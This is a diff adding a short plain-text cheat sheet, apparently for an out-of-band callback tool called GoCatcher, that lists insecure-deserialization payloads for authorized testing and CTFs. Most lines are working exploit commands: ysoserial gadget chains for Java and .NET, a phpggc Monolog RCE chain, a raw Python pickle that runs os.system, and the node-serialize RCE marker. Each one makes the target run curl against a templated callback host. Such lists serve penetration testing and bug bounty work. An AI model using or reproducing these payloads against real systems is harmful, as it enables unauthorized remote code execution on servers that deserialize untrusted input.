@@ -1,0 +1,19 @@
+===========================================================================
+ GoCatcher :: Insecure Deserialization notes  (text/plain)
+ FOR AUTHORIZED TESTING / CTF / BUG BOUNTY ONLY. Use ysoserial/phpggc etc.
+===========================================================================
+
+# Java (ysoserial) — OOB DNS/HTTP confirm via GoCatcher:
+java -jar ysoserial.jar URLDNS "http://{{callback_url}}/deser-java" | base64
+java -jar ysoserial.jar CommonsCollections5 'curl http://{{callback_url}}/deser-cc5' | base64
+
+# PHP object injection (phpggc):
+phpggc Monolog/RCE1 system 'curl http://{{callback_url}}/deser-php' -b
+
+# Python pickle (RCE on load) — authorized labs only:
+#   cos\nsystem\n(S'curl http://{{callback_url}}/deser-pickle'\ntR.
+
+# .NET (ysoserial.net):
+ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "curl http://{{callback_url}}/deser-net"
+
+# Ruby Marshal / Node node-serialize ({"rce":"_$$ND_FUNC$$_..."}) likewise.
